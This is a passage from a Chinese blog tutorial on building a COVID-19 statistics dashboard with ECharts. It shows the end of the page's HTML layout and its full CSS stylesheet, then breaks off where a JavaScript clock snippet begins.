<span class="tag">&lt;<span class="name">li</span>&gt;</span>累计确诊人数<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>累计治愈人数<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 地图模块 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"map3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span> <span class="attr">id</span>=<span class="string">"viewDiv"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 右 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"column"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel bl bar1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>世界疫情确诊情况前十五<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chart"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panelFooter"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"data"</span>&gt;</span>数据来源于腾讯，每小时更新一次<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css样式代码如下（详细的样式代码说明可以参照另外一篇博客<a href="https://ypigy.gitee.io/2020/07/20/Echarts/" target="_blank" rel="noopener">Echarts</a>）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 声明字体*/</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: electronicFont;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(../font/DS-DIGIT.TTF);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="comment">/* 覆盖整个页面 */</span></span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">25</span>, <span class="number">101</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'../images/head_bg.png'</span>) no-repeat top center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">1.25rem</span>;</span><br><span class="line">    <span class="comment">/* 🔺缩放比例 100% */</span></span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> <span class="selector-tag">h1</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.475rem</span>;</span><br><span class="line">    <span class="comment">/* 文字居中 */</span></span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.0rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.showTime</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0.375rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0.9375rem</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.25rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.index</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0.375rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0.9375rem</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.25rem</span>;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.data</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.2rem</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0.1rem</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">0.5rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mainbox</span> &#123;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">1024px</span>;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">1920px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.125rem</span> <span class="number">0.125rem</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="comment">/* background-color: lightpink; */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.mainbox</span> <span class="selector-class">.column</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.column</span><span class="selector-pseudo">:nth-child(2)</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">6</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0.125rem</span> <span class="number">0.1875rem</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="comment">/* position: relative; */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panel</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">5rem</span>;</span><br><span class="line">    <span class="comment">/* width: 100%; */</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">0.17</span>);</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">21</span>, <span class="number">25</span>, <span class="number">101</span>, <span class="number">0.5</span>) <span class="built_in">url</span>(<span class="string">'../images/line(1).png'</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">0.1875rem</span> <span class="number">0.5rem</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">0.3rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 蓝色小框 */</span></span><br><span class="line"><span class="selector-class">.bl</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bl</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panelFooter</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* background-color: pink; */</span></span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panelFooter</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panelFooter</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panel</span> <span class="selector-tag">h2</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0.6rem</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0.6rem</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.25rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">400</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panel</span> <span class="selector-class">.chart</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">4.5rem</span>;</span><br><span class="line">    <span class="comment">/* margin: 0 0.1875rem; */</span></span><br><span class="line">    <span class="comment">/* background-color: pink; */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bar1</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10.3rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bar1</span> <span class="selector-class">.chart</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10.3rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">101</span>, <span class="number">132</span>, <span class="number">226</span>, <span class="number">0.1</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.15rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">0.17</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">" "</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0.375rem</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0.125rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">" "</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0.375rem</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0.125rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.6rem</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0.5rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#ffeb7b</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: electronicFont;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-pseudo">:nth-child(1)</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">25%</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.2</span>);</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-bd</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-bd</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0.5rem</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.225rem</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">0.125rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.map</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">8.95rem</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="comment">/* border: 2px solid #02a6b5; */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.map</span> <span class="selector-class">.chart</span> &#123;</span><br><span class="line">    <span class="comment">/* background-color: #151965; */</span></span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">8.95rem</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">0.17</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> rotate &#123;</span><br><span class="line">    <span class="selector-tag">from</span> &#123;</span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>) <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">to</span> &#123;</span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>) <span class="built_in">rotate</span>(<span class="number">360deg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> rotate1 &#123;</span><br><span class="line">    <span class="selector-tag">from</span> &#123;</span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>) <span class="built_in">rotate</span>(<span class="number">0deg</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">to</span> &#123;</span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>) <span class="built_in">rotate</span>(-<span class="number">360deg</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width:</span> <span class="number">1024px</span>) &#123;</span><br><span class="line">    <span class="selector-tag">html</span> &#123;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">42px</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width:</span> <span class="number">1920</span>) &#123;</span><br><span class="line">    <span class="selector-tag">html</span> &#123;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">80px</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实时时间模块代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 